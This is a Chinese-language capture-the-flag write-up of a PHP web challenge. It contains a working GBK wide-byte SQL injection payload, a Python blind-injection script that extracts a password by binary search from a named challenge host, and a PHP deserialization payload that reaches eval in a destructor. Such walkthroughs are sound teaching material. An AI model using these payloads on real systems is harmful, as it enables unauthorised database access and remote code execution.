下载.index.php.swp和.login.php.swp获取源码

login.php

```php
<?php
    include "connection.php";
    mysqli_query($conn, "SET CHARACTER SET 'gbk'");

    $username=addslashes($_POST['username']);
    $password=addslashes($_POST['password']);
    $msg='';
    if(empty($username)){
        $msg='please post your username';
    }
    else{
        $sql="select * from users where username='$username'";
        $result=mysqli_query($conn,$sql);
        if($result){
            $row=mysqli_fetch_array($result,MYSQLI_ASSOC);
        }
        if(empty($row)){
            $msg='you are not reclu3e';
        }
        else{
            if($row['password']!==$password){
                $msg='I know you are reclu3e but you need post the right password';
            }
            else{
                session_start();
                $_SESSION['uid'] = $username;
                echo '<script>alert("Yes! you are reclu3e")</script>';
            }
        }
    }
    if(!empty($msg)){
        echo "<script>alert('$msg')</script>";
    }
    $conn->close();
    echo "<script type='text/javascript'>";  
    echo "window.location.href='index.php'";  
    echo "</script>";  
```

看到数据库编码为gbk，并且使用addslashes()函数进行过滤，考虑使用宽字节注入。注入脚本如下：

这里我已经首先进行手动注入得知密码长度为12位，payload为1%ed' or lenth((select password from users))=12%23。并且此处表名字段名在上面代码中已给出。并且注入前要根据题目提示猜测出用户名为reclu3e。

这里不适用requests库的原因是它会对post的数据进行url编码，编码后就破坏了payload，在我尝试利用request.Session和request.Parse发送请求并在其中修改post数据的值后，便出现发包后没有响应的情况（也可能是包没有发出），于是改用urllib库。

这里使用二分法获取密码而不是直接用等号进行遍历的原因不光是为了节省时间，mysql中0='a'的结果是true，因此可能导致结果全为0或空白符。

```python
import urllib.request
import urllib.parse
import time
name=''
for j in range(1,13):
    l = 32
    h = 127
    while abs(l-h)>1:
        i=int((l+h)/2)
        url="http://areyoureclu3e.whye.xyz/login.php"
        username="1%ed' or ascii(substr((select password from users),"+str(j)+",1))>"+str(i)+"%23"
        data={'username':username,'password':''}
        data=bytes(urllib.parse.urlencode(data),encoding='utf-8')
        data=data.replace(b'%25',b'%')
        r = urllib.request.urlopen(url=url,data=data)
        time.sleep(0.005)
        if r.status=='429':
            print('to fast')
        if 'I know you are reclu3e but you need post the right password' in str(r.read()):
            l = i
        else:
            h = i
    name += chr(h)
print(name)
```

获取密码后登录，再根据index.php源码进行反序列化

```php
<?php
    include "connection.php";
    include "flag.php";//$flag="minilctf{****}";

    session_start();
    if (empty($_SESSION['uid'])) {
        include "loginForm.html";
    }
    else{
        echo '<h1>Hello, reclu3e!</h1>';
        $p=unserialize(isset($_GET["p"])?$_GET["p"]:"");
    }
?>
<?php
class person{
    public $name;
    public $age;
    public $weight;
    public $height;
    private $serialize;
    public function __construct(){
        $this->name='';
        $this->age=0;
        $this->weight='0kg';
        $this->height='0cm';
    }
    public function __wakeup(){
        if(is_numeric($this->serialize)){
            $this->serialize++;
        }
    }
    public function __destruct(){
        @eval('$s="'.$this->serialize.'";');
    }
}
```

这里__destruct()析构函数处存在命令执行，此处可以利用$this->serialize进行命令执行。为什么能执行看[这篇文章](https://cloud.tencent.com/developer/article/1148417)

首先在下载的index.php文件下面加上

```php
$a=new person();
echo serialize($a);
```

可以获取到序列化后的person对象：

O:6:"person":5:{s:4:"name";s:0:"";s:3:"age";i:0;s:6:"weight";s:3:"0kg";s:6:"height";s:3:"0cm";s:17:"personserialize";N;}

在其中的serialize部分加入payload，将其改为：

O:6:"person":5:{s:4:"name";s:0:"";s:3:"age";i:0;s:6:"weight";s:3:"0kg";s:6:"height";s:3:"0cm";s:17:"%00person%00serialize";s:26:"${print($GLOBALS[%27flag%27])}";}

然后get方式提交为参数即可获取flag

php序列化时会在private变量名前的类名前后加上空白符%00，但是打印出来会丢失，所以要加上。这也是为什么'personserialize'只有15位而前面会显示s:17的原因。

这里我们打印$flag时，由于$flag是全局变量，在方法内无法直接访问，所以利用超全局变量$GLOBALS数组进行访问。该数组储存了所有的全局变量。

